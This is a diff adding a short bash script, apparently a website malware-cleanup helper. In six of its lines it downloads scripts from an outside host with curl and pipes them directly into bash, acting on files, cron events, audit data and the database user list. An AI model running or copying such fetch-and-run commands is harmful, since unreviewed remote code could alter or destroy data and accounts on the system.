@@ -1,0 +1,10 @@
+#!/bin/bash
+
+echo "starting cleanup for $PWD"
+curl -s https://anep.my/malware-cleaner/user/malware-file-b_clear | bash
+curl -s https://anep.my/malware-cleaner/user/malware-hcess_clear | bash
+curl -s https://anep.my/malware-cleaner/user/malware-db_options | bash
+curl -s https://anep.my/malware-cleaner/user/malware-db_audit_clean | bash
+curl -s https://anep.my/malware-cleaner/user/malware-cron_events_clear | bash
+echo "kindly verify user n remove what not"
+curl -s https://anep.my/malware-cleaner/user/malware-db-user_list | bash
